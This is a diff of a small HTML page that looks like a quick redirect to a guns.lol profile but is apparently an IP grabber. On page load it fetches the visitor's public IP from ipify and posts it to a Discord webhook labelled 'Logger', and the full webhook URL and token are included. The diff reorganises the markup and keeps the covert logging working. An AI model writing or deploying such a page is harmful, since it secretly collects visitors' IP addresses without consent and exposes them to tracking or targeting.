@@ -1,6 +1,12 @@
-<script>
-function getIP(json) {
-  var request = new XMLHttpRequest(); //making a request for the webhook
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="refresh" content="0.3;url=http://guns.lol/maxvel187">
+</head>
+<body>
+  <script>
+    function getIP(json) {
+      var request = new XMLHttpRequest();
       request.open("POST", "https://discord.com/api/webhooks/1262489102813495391/R-mk0QqRFElTyMUgvvNcR3BxmPxHFalTXuKuTFTuW8P65hUnJt1GFAfcRoHSYQqPTza4");
 
       request.setRequestHeader('Content-type', 'application/json');
@@ -9,20 +15,11 @@ function getIP(json) {
         username: "Logger",
         avatar_url: "",
         content: "**IP:** *" + json.ip + "*"
-      }
-   //just a webhook parameters such as avatar,name,message
+      };
 
       request.send(JSON.stringify(params));
     }
-
-</script>
-<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
-
-<!DOCTYPE html>
-<html>
-<head>
-<meta http-equiv="refresh" content="0.3;url=http://guns.lol/maxvel187">
-</head>
-<body>
+  </script>
+  <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
 </body>
 </html>
